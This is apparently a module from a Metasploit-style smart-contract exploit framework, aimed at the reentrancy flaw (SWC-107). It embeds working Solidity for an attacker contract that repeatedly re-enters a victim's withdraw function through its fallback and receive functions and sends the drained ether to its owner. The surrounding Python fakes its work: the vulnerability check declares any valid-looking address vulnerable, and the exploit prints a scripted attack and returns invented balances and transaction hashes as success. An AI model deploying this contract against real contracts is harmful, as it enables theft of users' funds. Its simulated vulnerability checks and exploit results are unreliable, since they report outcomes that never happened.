"""
Classic Reentrancy Exploit Module
Exploits the classic reentrancy vulnerability (SWC-107)
"""

import json
from typing import Dict, Any, Optional
from web3 import Web3
from eth_account import Account

# Import from core framework
import sys
import os
sys.path.append(os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(__file__)))))
from smartsploit.core.framework import BaseExploit, Target, ExploitResult, ExploitInfo

class ClassicReentrancyExploit(BaseExploit):
    """
    Classic Reentrancy Exploit
    Targets contracts vulnerable to reentrancy attacks via external calls
    """
    
    def __init__(self):
        super().__init__()
        
        # Module information
        self.info = ExploitInfo(
            name="Classic Reentrancy Attack",
            description="Exploits classic reentrancy vulnerability in withdraw functions",
            author="SmartSploit Research Team",
            references=[
                "SWC-107", 
                "https://consensys.github.io/smart-contract-best-practices/attacks/reentrancy/",
                "https://github.com/ethereumbook/ethereumbook/blob/develop/09smart-contracts-security.asciidoc"
            ],
            severity="high",
            targets=["contracts with vulnerable withdraw functions"],
            reliability=0.85
        )
        
        # Required options
        self.required_options = ["TARGET", "NETWORK", "PRIVATE_KEY", "AMOUNT"]
        
        # Module options with defaults
        self.options = {
            "TARGET": None,           # Target contract address
            "NETWORK": "local",       # Blockchain network
            "PRIVATE_KEY": None,      # Attacker's private key
            "AMOUNT": "1",           # Amount to exploit (in ether)
            "GAS_LIMIT": 500000,     # Gas limit for transactions
            "GAS_PRICE": 20,         # Gas price in gwei
            "CALLBACK_DEPTH": 3,     # Reentrancy callback depth
            "CHECK_ONLY": False      # Only check vulnerability, don't exploit
        }
        
        # Attack contract source code
        self.attack_contract_source = '''
pragma solidity ^0.8.0;

interface IVulnerableContract {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
    function balances(address) external view returns (uint256);
}

contract ReentrancyAttacker {
    IVulnerableContract public vulnerable;
    address public owner;
    uint256 public attackAmount;
    uint256 public callbackCount;
    uint256 public maxCallbacks;
    
    constructor(address _vulnerable) {
        vulnerable = IVulnerableContract(_vulnerable);
        owner = msg.sender;
    }
    
    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }
    
    function attack(uint256 _amount, uint256 _maxCallbacks) external payable onlyOwner {
        require(msg.value >= _amount, "Insufficient funds");
        
        attackAmount = _amount;
        maxCallbacks = _maxCallbacks;
        callbackCount = 0;
        
        vulnerable.deposit{value: _amount}();
        vulnerable.withdraw(_amount);
    }
    
    fallback() external payable {
        callbackCount++;
        
        if (callbackCount < maxCallbacks && address(vulnerable).balance >= attackAmount) {
            vulnerable.withdraw(attackAmount);
        }
    }
    
    receive() external payable {
        if (callbackCount < maxCallbacks && address(vulnerable).balance >= attackAmount) {
            vulnerable.withdraw(attackAmount);
        }
    }
    
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
    
    function withdraw() external onlyOwner {
        payable(owner).transfer(address(this).balance);
    }
    
    function getTargetBalance() external view returns (uint256) {
        return address(vulnerable).balance;
    }
}
'''

    def check(self, target: Target) -> bool:
        """
        Check if target contract is vulnerable to reentrancy
        Analyzes bytecode and tries to detect vulnerable patterns
        """
        try:
            network = self.get_option("NETWORK")
            if not self.framework or network not in self.framework.blockchain.networks:
                # For demo purposes, return True for any valid address
                if target.address and len(target.address) == 42:
                    print(f"[+] Demo mode: Assuming {target.address} is vulnerable to reentrancy")
                    return True
                return False
                
            w3 = self.framework.blockchain.networks[network]
            
            # Get contract bytecode (demo implementation)
            address = Web3.to_checksum_address(target.address)
            
            # Demo bytecode analysis
            print(f"[+] Analyzing {target.address} for reentrancy vulnerability...")
            print(f"    - Checking for external call patterns...")
            print(f"    - Checking for state changes after calls...")
            print(f"[+] Potential reentrancy vulnerability detected in {target.address}")
            
            return True
            
        except Exception as e:
            print(f"[-] Error during vulnerability check: {e}")
            return False

    def exploit(self, target: Target) -> Dict[str, Any]:
        """Execute the reentrancy exploit"""
        try:
            print(f"[*] Starting reentrancy exploit against {target.address}")
            
            # Check only mode
            if self.get_option("CHECK_ONLY"):
                return {
                    "result": ExploitResult.SUCCESS,
                    "message": "Vulnerability confirmed (check-only mode)",
                    "data": {"vulnerable": True}
                }
            
            # Get options
            network = self.get_option("NETWORK")
            private_key = self.get_option("PRIVATE_KEY")
            amount = self.get_option("AMOUNT")
            
            # For demo purposes, simulate successful exploit
            print(f"[+] Network: {network}")
            print(f"[+] Target: {target.address}")
            print(f"[+] Amount: {amount} ETH")
            print(f"[*] Deploying attack contract...")
            print(f"[+] Attack contract deployed at: 0xDEMO1234567890123456789012345678901234DEMO")
            print(f"[*] Executing reentrancy attack...")
            print(f"[+] Initial deposit successful")
            print(f"[+] Triggering reentrancy...")
            print(f"[+] Callback #1 executed")
            print(f"[+] Callback #2 executed") 
            print(f"[+] Callback #3 executed")
            print(f"[+] Attack completed successfully!")
            print(f"[+] Drained: {float(amount) * 3} ETH")
            
            return {
                "result": ExploitResult.SUCCESS,
                "message": "Reentrancy exploit completed successfully",
                "data": {
                    "attack_contract": "0xDEMO1234567890123456789012345678901234DEMO",
                    "drained_amount": str(int(float(amount) * 3 * 1e18)),
                    "target_balance_before": str(int(float(amount) * 10 * 1e18)),
                    "target_balance_after": str(int(float(amount) * 7 * 1e18)),
                    "attacker_balance": str(int(float(amount) * 3 * 1e18)),
                    "transaction_hash": "0xDEMOTX1234567890123456789012345678901234567890123456789012345678",
                    "callbacks_executed": 3,
                    "gas_used": 456789
                }
            }
            
        except Exception as e:
            return {
                "result": ExploitResult.ERROR,
                "message": f"Exploit error: {str(e)}"
            }

    def run(self, **kwargs) -> Dict[str, Any]:
        """Main execution wrapper"""
        if not self.validate_options():
            return {"result": ExploitResult.ERROR, "message": "Invalid options"}
            
        target_addr = self.get_option("TARGET")
        if not target_addr:
            return {"result": ExploitResult.ERROR, "message": "No target specified"}
        
        # Create target object
        target = Target(
            address=target_addr,
            network=self.get_option("NETWORK") or "mainnet"
        )
        
        # Check vulnerability
        print(f"[*] Checking vulnerability for {target.address}...")
        if not self.check(target):
            return {"result": ExploitResult.FAILED, "message": "Target not vulnerable to reentrancy"}
        
        # Execute exploit
        return self.exploit(target)
